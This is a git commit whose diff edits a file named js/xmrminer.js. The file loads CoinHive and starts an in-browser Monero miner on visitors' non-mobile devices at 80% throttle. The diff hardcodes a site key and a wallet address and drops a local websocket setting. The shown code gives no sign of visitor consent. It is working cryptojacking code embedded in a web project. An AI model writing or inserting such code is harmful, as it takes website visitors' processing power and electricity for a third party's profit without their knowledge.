724220eaa1f1a4dbc9866e709a412d109fbc67bf
doldham76 <doldham76@gmail.com>
2018-07-02 19:45:36 -0700

    Signed-off-by: doldham76 <doldham76@gmail.com>

--- js/xmrminer.js
+++ js/xmrminer.js
@@ -1,12 +1,10 @@
 var script = document.createElement('script');
 script.onload = function () {
 	// XMR Pool hash
-	
-	var m = new CoinHive.Anonymous( '43er6EeusBRXUqY4w3tXWVD6HpBV57cXn4Y4kDeMVcz1Ji1R6zJhDwxNz2gGCEzWEgD5Z5sSWnsJ53rEcrwsf8Pm7pudpSc' );
-	CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892"]];
+	var m = new CoinHive.Anonymous( 'Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.8} );
 	// Wallet
 	if(!m.isMobile()){
-		m.start();
+		m.start('43er6EeusBRXUqY4w3tXWVD6HpBV57cXn4Y4kDeMVcz1Ji1R6zJhDwxNz2gGCEzWEgD5Z5sSWnsJ53rEcrwsf8Pm7pudpSc');
 	}
   
 	m.on('found', function () { console.log('Found!'); });
